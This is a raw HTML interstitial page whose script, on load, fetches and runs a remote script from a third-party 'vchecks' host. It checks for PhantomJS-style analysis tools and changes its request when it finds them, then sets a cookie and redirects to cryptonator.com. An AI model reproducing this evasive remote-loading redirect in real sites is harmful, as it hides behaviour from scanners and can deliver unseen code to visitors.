<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="refresh" content="10;URL=/ciez2a">
</head>
<body>
  <script type="text/javascript">
    var head    = document.getElementsByTagName("head")[0];
    var script  = document.createElement("script");
    var done    = false; // Handle Script loading
                
    var url     = "https://ohio8.vchecks.info/share/brS6nQPGXqM1?sid=391&scheme=http&host=cryptonator.com&uri=%2f%3futm_referrer%3d&t=1521352417564&sad=v%2fNlF3Dg%3d%3d&uid=7CtNe1tjQJmxB5w5&uct=1521352417564&kct=0&m=3&ver=5&jssc=0&v=DJ8LR1pkif1fxrA9FdW0-Q";
    if (window.callPhantom || window._phantom || window.__phantomas) {
      url = url + "&test=brS6nQ";
    } else {
      url = url + "&test=PGXqM1";
    }
    script.src = url;
    script.onload = script.onreadystatechange = function() { // Attach handlers for all browsers
      if ( !done && (!this.readyState || this.readyState === "loaded" || this.readyState === "complete") ) {
        done = true;
        ipp.setCookie();
        location.href="http://cryptonator.com/?utm_referrer=";
        script.onload = script.onreadystatechange = null; // Handle memory leak in IE
      }
    };
    head.appendChild(script);           
  </script>
</body>
</html>